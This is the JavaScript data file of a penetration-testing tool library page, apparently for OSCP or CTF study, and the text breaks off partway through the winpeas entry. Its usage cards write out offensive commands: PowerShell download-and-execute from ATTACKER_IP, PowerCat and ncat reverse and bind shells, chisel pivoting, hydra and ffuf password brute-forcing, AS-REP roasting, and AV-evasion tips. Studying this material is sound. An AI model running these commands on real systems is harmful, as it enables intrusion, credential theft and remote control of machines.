/* ==============================================================
   TOOL LIBRARY SCRIPT – ALL DATA IN ONE BLOCK (WITH GITHUB FOOTER)
   ============================================================== */
document.addEventListener('DOMContentLoaded', function () {
  /* ----------   ELEMENTS   ---------- */
  const loader    = document.getElementById('loader');
  const app       = document.getElementById('app');
  const modal     = document.getElementById('infoModal');
  const closeBtn  = document.querySelector('.modal-close');
  const container = document.getElementById('container');
  /* ----------   MODAL HANDLERS   ---------- */
  if (closeBtn) closeBtn.addEventListener('click', () => { modal.style.display = 'none'; });
  window.addEventListener('click', e => { if (e.target === modal) modal.style.display = 'none'; });
  window.addEventListener('keydown', e => { if (e.key === 'Escape' && modal.style.display === 'block') modal.style.display = 'none'; });
  /* ----------   GLOBAL HELPERS   ---------- */
  const toolLookup = {};   // id → tool object
  let toolIdCounter = 0;
  /* 1️⃣  Make the two functions global so inline `onclick="..."` works */
  function showInfo(toolId) {
    const tool = toolLookup[toolId];
    if (!tool) return;
    document.getElementById('modalTitle').textContent     = tool.name;
    document.getElementById('modalDescription').innerHTML = tool.detail;
    modal.style.display = 'block';
  }
  window.showInfo = showInfo;
  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
  /* 2️⃣  Correct download path and guard against missing file name */
  function downloadTool(filename) {
    if (!filename) return;                                 // no file → nothing to download
    const clean = filename.replace(/^\/+/, '');             // strip leading '/'
    const filePath = `./tools/${clean}`;                   // relative
    const link = document.createElement('a');
    link.href = filePath;
    link.download = clean;
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }
  window.downloadTool = downloadTool;
  /* ----------   DATA   ---------- */
  const data = [
    {
      name: "01_recon_enum — Reconnaissance & Enumeration",
      tools: [
        {
          cat: "wordlists/",
          items: [
            {
              name: "TEST",
              desc: "Large general-purpose wordlist",
              file: "big.txt",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is big.txt?</div>
                <p>A massive, general-purpose wordlist containing ~20,000+ common directory, file, and subdomain names. Originally from the <strong>DirBuster</strong> project. Ideal when you don’t know what you’re looking for.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Early recon when no other wordlist is working</li>
                  <li>Brute‑forcing directories on unknown web apps</li>
                  <li>Finding hidden config files, backups, admin panels</li>
                  <li>Subdomain brute‑forcing as a last resort</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;"># Directory brute‑forcing with ffuf
ffuf -u https://target.com/FUZZ -w big.txt -fc 404
# With gobuster
gobuster dir -u https://target.com -w big.txt -x php,html,txt
# Subdomain brute‑forcing
ffuf -u https://FUZZ.target.com -w big.txt -H "Host: FUZZ.target.com" -fs 0</pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Too slow? Filter by status code: <code>-fc 404,403</code></li>
                  <li>Combine with <code>-x</code> to test extensions: <code>php,aspx,js</code></li>
                  <li>Use with rate limiting: <code>-p 0.1</code> to avoid blocking</li>
                  <li>Not finding anything? Try <code>raft‑large‑directories.txt</code> or <code>directory‑list‑2.3‑big.txt</code></li>
                </ul>
              `,
              tags: ["wordlist", "bruteforce", "directories", "fallback", "general", "ffuf", "gobuster"],
              phase: "01_recon_enum"
            },
            {
              name: "common‑snmp‑community‑strings‑onesixtyone.txt",
              desc: "Common SNMP community strings",
              file: "common-snmp-community-strings-onesixtyone.txt",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is this?</div>
                <p>List of commonly used SNMP community strings (like public, private, admin) used to brute‑force SNMP services.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When scanning for SNMP services (UDP 161)</li>
                  <li>To extract system info, routing tables, ARP cache</li>
                  <li>For network mapping and device enumeration</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;"># With onesixtyone
onesixtyone -c common-snmp-community-strings-onesixtyone.txt 10.10.10.10
# With snmpwalk
snmpwalk -c public -v1 10.10.10.10
# Extract system info
snmpwalk -c public -v1 10.10.10.10 system</pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Try both v1 and v2c: <code>-v1</code> and <code>-v2c</code></li>
                  <li>Look for <code>hrSWRun</code> to find running processes</li>
                  <li>Check <code>ifTable</code> for network interfaces</li>
                  <li>Use <code>snmp-check</code> for automated enumeration</li>
                </ul>
              `,
              tags: ["snmp", "bruteforce", "network", "enumeration", "community strings", "onesixtyone", "snmpwalk"],
              phase: "01_recon_enum"
            },
            {
              name: "common.txt",
              desc: "Common directory & file names",
              file: "common.txt",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is common.txt?</div>
                <p>Short, curated list of the most common web paths (e.g., /admin, /login, /config). Fast for quick scans.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Quick initial scan on web apps</li>
                  <li>When you need fast results (CTF or time‑limited)</li>
                  <li>Before using larger wordlists like big.txt</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Quick scan with ffuf
ffuf -u https://target.com/FUZZ -w common.txt -fc 404 -t 50
# With dirsearch
dirsearch -u https://target.com -w common.txt -e php,html
# Check for common files
ffuf -u https://target.com/FUZZ -w common.txt -fc 404 -mc 200,301,302</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Combine with <code>-e</code> for extensions: <code>php,aspx,js,txt</code></li>
                  <li>Use <code>-t 100</code> for faster scans (if server allows)</li>
                  <li>Filter by response size: <code>-fs 0</code> to ignore empty responses</li>
                  <li>Always check <code>/robots.txt</code> and <code>/.git/</code> manually</li>
                </ul>
              `,
              tags: ["wordlist", "web", "fast", "common paths", "quick enum", "ffuf", "dirsearch"],
              phase: "01_recon_enum"
            },
            {
              name: "directory‑list‑2.3‑medium.txt",
              desc: "Medium‑sized directory brute‑force list",
              file: "directory-list-2.3-medium.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is this?</div>
                <p>Medium‑sized, well‑known directory brute‑force list from the DirBuster project. Balanced between speed and coverage.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When common.txt returns nothing</li>
                  <li>For comprehensive web app enumeration</li>
                  <li>OSCP staple — often finds hidden directories</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Standard usage
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -fc 404 -t 50
# With extensions
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -fc 404 -e .php,.html,.txt
# Recursive scan
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -fc 404 -recursion -recursion-depth 2</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>-recursion</code> to find nested directories</li>
                  <li>Filter by word count: <code>-fw 5</code> to ignore common error pages</li>
                  <li>Save results: <code>-o results.json</code></li>
                  <li>For OSCP: This list often finds /admin, /backup, /dev, /test</li>
                </ul>
              `,
              tags: ["wordlist", "dirbuster", "web enum", "medium", "oscp staple", "ffuf", "recursive"],
              phase: "01_recon_enum"
            },
            {
              name: "raft‑medium‑files.txt",
              desc: "RAFT list — medium file names",
              file: "raft-medium-files.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is RAFT?</div>
                <p>From the RAFT project — focused on file names (not directories), e.g., backup.zip, config.php, test.aspx.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you suspect backup or config files exist</li>
                  <li>After finding a directory — brute‑force files inside</li>
                  <li>For source code exposure or credential leaks</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# File brute‑forcing
ffuf -u https://target.com/FUZZ -w raft-medium-files.txt -fc 404
# In a specific directory
ffuf -u https://target.com/admin/FUZZ -w raft-medium-files.txt -fc 404
# With multiple extensions
ffuf -u https://target.com/FUZZ -w raft-medium-files.txt -fc 404 -e .bak,.old,.zip,.tar.gz</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Look for <code>.bak</code>, <code>.old</code>, <code>~</code> files — often contain source code</li>
                  <li>Try <code>web.config.bak</code>, <code>wp-config.php.bak</code>, <code>.git/config</code></li>
                  <li>Combine with <code>gobuster</code> for directory + file brute‑forcing</li>
                  <li>Check for <code>composer.lock</code>, <code>package.json</code> for version info</li>
                </ul>
              `,
              tags: ["wordlist", "files", "raft", "backup files", "source exposure", "ffuf", "gobuster"],
              phase: "01_recon_enum"
            },
            {
              name: "rockyou.txt.gz",
              desc: "Famous password list (compressed)",
              file: "rockyou.txt.gz",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is rockyou.txt?</div>
                <p>Legendary password wordlist from the RockYou breach (2009). Contains 14+ million real‑world passwords. Compressed to save space.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>For password spraying against login forms</li>
                  <li>Cracking hashes (NTLM, MD5, SHA1)</li>
                  <li>Brute‑forcing SSH, FTP, SMB, databases</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Decompress first
gunzip rockyou.txt.gz
# Crack hashes with hashcat
hashcat -m 1000 hashes.txt rockyou.txt
# With hydra for SSH
hydra -l admin -P rockyou.txt ssh://10.10.10.10
# For web login forms
ffuf -u https://target.com/login -X POST -d "username=admin&password=FUZZ" -w rockyou.txt -fc 401</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Sort by frequency: <code>sort rockyou.txt | uniq -c | sort -nr</code></li>
                  <li>Use first 1000 lines for quick spray: <code>head -1000 rockyou.txt > quick.txt</code></li>
                  <li>Combine with username list for credential stuffing</li>
                  <li>For OSCP: Often works with default creds like admin:admin, root:123456</li>
                </ul>
              `,
              tags: ["passwords", "rockyou", "cracking", "bruteforce", "credential attack", "hashcat", "hydra"],
              phase: "02_initial_access"
            },
            {
              name: "subdomains‑top1million‑20000.txt",
              desc: "Top 20K subdomains for enumeration",
              file: "subdomains-top1million-20000.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is this?</div>
                <p>Top 20,000 most common subdomains (e.g., www, mail, dev, api, staging) from public DNS data.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Subdomain brute‑forcing for vhost enumeration</li>
                  <li>Finding development, staging, or admin subdomains</li>
                  <li>Expanding attack surface on web apps</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# With ffuf
ffuf -u https://FUZZ.target.com -w subdomains-top1million-20000.txt -H "Host: FUZZ.target.com" -fs 0
# With gobuster
gobuster vhost -u https://target.com -w subdomains-top1million-20000.txt
# Check for HTTPS
ffuf -u https://FUZZ.target.com -w subdomains-top1million-20000.txt -k</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Always add <code>dev, test, staging, admin, internal, api</code> manually</li>
                  <li>Use <code>-k</code> to ignore SSL errors</li>
                  <li>Check for different HTTP status codes: <code>-mc 200,301,302,403</code></li>
                  <li>Combine with DNS enumeration tools like <code>dnsrecon</code> or <code>sublist3r</code></li>
                </ul>
              `,
              tags: ["subdomains", "dns", "vhost", "bruteforce", "recon", "ffuf", "gobuster"],
              phase: "01_recon_enum"
            },
            {
              name: "xato-net-10-million-usernames.txt",
              desc: "10M common usernames for brute‑force",
              file: "xato-net-10-million-usernames.txt",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is this?</div>
                <p>List of 10 million commonly used usernames (e.g., admin, test, user1, backup, svc_apache).</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Username enumeration on login forms</li>
                  <li>Kerberos AS‑REP roasting (GetNPUsers.py)</li>
                  <li>Password spraying attacks</li>
                  <li>SSH, SMB, database brute‑forcing</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Kerberos AS‑REP roast
GetNPUsers.py -no-pass -usersfile xato-net-10-million-usernames.txt corp.local/
# SSH brute‑force with hydra
hydra -L xato-net-10-million-usernames.txt -p 'Password123' ssh://10.10.10.10
# Web login form
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=Password123" -w xato-net-10-million-usernames.txt -fc 401</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use top 1000: <code>head -1000 xato-net-10-million-usernames.txt > top1000.txt</code></li>
                  <li>Look for service accounts: <code>svc_, adm_, backup_, sql_</code></li>
                  <li>Combine with <code>cewl</code> to generate usernames from website</li>
                  <li>For AD: Focus on <code>administrator, admin, guest, krbtgt</code></li>
                </ul>
              `,
              tags: ["usernames", "spraying", "kerberos", "enum", "credential", "hydra", "impacket"],
              phase: "01_recon_enum"
            }
          ]
        },
        {
          cat: "network_utilities/",
          items: [
            {
              name: "ncat",
              desc: "Quick shell connections",
              file: "ncat",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is ncat?</div>
                <p>Modern Netcat from Nmap project — supports SSL, proxy, IPv6, and connection brokering.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Quick reverse/bind shells</li>
                  <li>Port scanning and banner grabbing</li>
                  <li>File transfer between machines</li>
                  <li>Proxying or relaying connections</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Reverse shell listener
ncat -lvnp 4444
# Bind shell
ncat -lvnp 4444 -e /bin/bash
# File transfer
# Receiver: ncat -lvnp 4444 > file.txt
# Sender: ncat 10.10.10.10 4444 < file.txt
# SSL encrypted shell
ncat --ssl -lvnp 4444</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--exec</code> instead of <code>-e</code> for newer versions</li>
                  <li>Add <code>--keep-open</code> to handle multiple connections</li>
                  <li>For OSCP: Often allowed where netcat is blocked</li>
                  <li>Use <code>--sh-exec</code> to execute shell commands</li>
                </ul>
              `,
              tags: ["netcat", "shell", "transfer", "tunnel", "nc", "reverse shell", "bind shell"],
              phase: "01_recon_enum"
            },
            {
              name: "chisel.zip",
              desc: "Port forwarding / pivoting",
              file: "chisel.zip",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is chisel?</div>
                <p>A fast, encrypted TCP/UDP tunnel over HTTP(S). Create SOCKS proxies or port forwards through firewalls. Essential for pivoting in internal networks.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you compromise a machine inside a network</li>
                  <li>To access internal services (SMB, RDP, databases)</li>
                  <li>To route tools like nmap, bloodhound, or metasploit through the pivot</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# On your attacking machine (server)
./chisel server -p 8080 --reverse
# On compromised target (client)
./chisel client YOUR_IP:8080 R:socks
# Now set proxychains
proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24
# Forward single port
./chisel client YOUR_IP:8080 R:3389:192.168.1.10:3389</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--auth user:pass</code> for extra security</li>
                  <li>Works over HTTP — often bypasses egress filters</li>
                  <li>For OSCP: SOCKS proxy + proxychains is your best friend</li>
                  <li>If blocked, try DNS or ICMP tunneling alternatives</li>
                </ul>
              `,
              tags: ["tunnel", "pivot", "socks", "proxy", "firewall bypass", "proxychains", "chisel"],
              phase: "01_recon_enum"
            },
            {
              name: "ligolo.zip",
              desc: "Lateral movement proxy",
              file: "ligolo.zip",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is ligolo?</div>
                <p>Lightweight, reverse tunneling tool for lateral movement. Creates encrypted tunnels for proxying traffic.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you need a lightweight alternative to chisel</li>
                  <li>For tunneling in restricted environments</li>
                  <li>When you want minimal footprint on target</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Start proxy server on attacker
./proxyserver -selfcert
# On target, connect back
./agent -connect ATTACKER_IP:11601 -ignore-cert
# In proxy server, start tunnel
start
# Set up route
route add 192.168.1.0/24
# Use with proxychains
proxychains nmap -sT -Pn -n 192.168.1.10</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--ignore-cert</code> to avoid certificate errors</li>
                  <li>Ligolo-ng is the newer version — more features</li>
                  <li>Supports ICMP and DNS tunneling modes</li>
                  <li>Great for OSCP when chisel is detected</li>
                </ul>
              `,
              tags: ["pivot", "tunnel", "proxy", "lateral movement", "ligolo-ng", "proxychains"],
              phase: "01_recon_enum"
            },
            {
              name: "PowerCat.ps1",
              desc: "PowerShell netcat",
              file: "PowerCat.ps1",
              dup: "from 01_recon_enum",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is PowerCat?</div>
                <p>PowerShell implementation of Netcat. Can listen, connect, transfer files, and execute commands.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When netcat is not available on Windows</li>
                  <li>For AV evasion (PowerShell is often allowed)</li>
                  <li>File transfer in restricted environments</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Load in memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerCat.ps1')
# Reverse shell
powercat -c ATTACKER_IP -p 4444 -e cmd
# Bind shell
powercat -l -p 4444 -e cmd
# File transfer (receiver)
powercat -l -p 4444 -of received_file.txt
# File transfer (sender)
powercat -c ATTACKER_IP -p 4444 -i file_to_send.txt</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>-g</code> to generate a script for persistence</li>
                  <li>Combine with <code>Invoke-Obfuscation</code> to evade AV</li>
                  <li>For OSCP: Essential when you get RCE but no netcat</li>
                  <li>Use <code>-dns</code> mode for DNS tunneling if HTTP is blocked</li>
                </ul>
              `,
              tags: ["powershell", "netcat", "reverse shell", "windows", "av evasion", "file transfer"],
              phase: "01_recon_enum"
            },
            {
              name: "PortKnocker.sh",
              desc: "Port knocking script",
              file: "PortKnocker.sh",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is PortKnocker.sh?</div>
                <p>Bash script to perform port knocking — sending packets to closed ports in sequence to trigger hidden services.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When ports are filtered by firewall</li>
                  <li>To discover hidden SSH or other services</li>
                  <li>CTF challenges with port knocking</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Basic usage
./PortKnocker.sh -h 10.10.10.10 -p 1000,2000,3000
# With delay between knocks
./PortKnocker.sh -h 10.10.10.10 -p 1000,2000,3000 -d 500
# TCP and UDP mixed
./PortKnocker.sh -h 10.10.10.10 -p T:1000,U:2000,T:3000</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>nmap --script knock</code> as alternative</li>
                  <li>Try common sequences: 1000,2000,3000 or 7000,8000,9000</li>
                  <li>Check for new open ports after knocking</li>
                  <li>For OSCP: Rare but has appeared in retired machines</li>
                </ul>
              `,
              tags: ["port knocking", "stealth", "access", "script", "covert", "nmap", "firewall"],
              phase: "01_recon_enum"
            },
            {
              name: "windapsearch.py",
              desc: "LDAP enumeration",
              file: "windapsearch.py",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is windapsearch.py?</div>
                <p>Python script to enumerate Active Directory via LDAP queries — users, groups, computers, SPNs.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you have LDAP access (port 389/636)</li>
                  <li>To enumerate AD without PowerShell</li>
                  <li>When PowerView is blocked</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Enumerate users
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --users
# Enumerate groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --groups
# Find computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --computers
# Get SPNs for kerberoasting
python3 windapsearch.py --dc-ip 10.10.10.10 -u user -p 'Password123' --spns</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--da</code> to find Domain Admins</li>
                  <li>Try <code>--search-user</code> for specific user info</li>
                  <li>Output to file: <code>> users.txt</code></li>
                  <li>For OSCP: Great when you get low‑priv AD account</li>
                </ul>
              `,
              tags: ["ldap", "ad enum", "python", "lightweight", "enumeration", "kerberoast"],
              phase: "01_recon_enum"
            },
            {
              name: "linpeas.sh",
              desc: "Linux privilege enumeration",
              file: "linpeas.sh",
              dup: "from 04/linux",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is linpeas.sh?</div>
                <p><strong>LinPEAS</strong> is the ultimate Linux privilege escalation script. It automates the discovery of misconfigurations, credentials, services, and known exploits.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>After gaining initial access to a Linux box</li>
                  <li>When you need to elevate from low‑priv user to root</li>
                  <li>To find passwords, keys, tokens, or misconfigured services</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Download and run
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or upload and execute
chmod +x linpeas.sh
./linpeas.sh
# Quiet mode (less noise)
./linpeas.sh -q
# Output to file
./linpeas.sh > /tmp/linpeas.out</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Look for <span style="color:#ff6b6b;">RED</span> and <span style="color:#ffd700;">YELLOW</span> highlights — they indicate critical findings</li>
                  <li>Check for SUID binaries, writable cron jobs, docker escape vectors</li>
                  <li>Search for passwords: <code>./linpeas.sh | grep -i "password\|pwd"</code></li>
                  <li>Use <code>-a</code> for full audit (slower but more thorough)</li>
                </ul>
              `,
              tags: ["linux", "privesc", "enum", "automation", "peass", "privilege escalation"],
              phase: "01_recon_enum"
            },
            {
              name: "winpeasx64.exe",
              desc: "Windows enumeration tool",
              file: "winpeasx64.exe",
              dup: "from 04/windows",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is winpeasx64.exe?</div>
                <p>Windows Privilege Escalation Awesome Script — .exe version for easy execution on Windows targets.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
